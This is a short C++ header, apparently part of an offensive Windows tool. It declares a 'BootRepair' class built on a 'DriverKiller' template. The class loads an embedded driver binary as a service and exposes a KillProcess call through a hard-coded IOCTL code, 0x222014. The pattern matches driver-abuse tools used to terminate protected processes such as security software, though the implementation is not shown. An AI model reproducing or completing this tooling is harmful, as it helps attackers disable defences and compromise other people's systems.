#pragma once
#include <windows.h>
#include <string>
#include "DriverProvider.hpp"
#include "DriverService.hpp"
#include "Singleton.hpp"
#include "ObjectProxy.hpp"
#include "BootRepairBin.hpp"
#include "DriverKiller.hpp"

class BootRepair final :
	public DriverKiller<BootRepair>,
	public Singleton<BootRepair>
{
	friend class Singleton<BootRepair>;

private:
	static constexpr ULONG IOCTL_KILL_PROCESS = 0x222014u;

public:
	explicit BootRepair(Token) noexcept : BootRepair()
	{
	}
	~BootRepair() = default;

	BOOLEAN InitKiller() noexcept
	{
		return DriverKiller::Initialize(BootRepairBin::hexData,
										BootRepairBin::hexSize,
										BootRepairBin::service,
										BootRepairBin::serviceSize,
										BootRepairBin::Key);
	}

	BOOLEAN
		KillProcess(ULONG Pid);

private:
	BootRepair() = default;
};



inline constexpr ObjectProxy<BootRepair> g_BootRepair{};

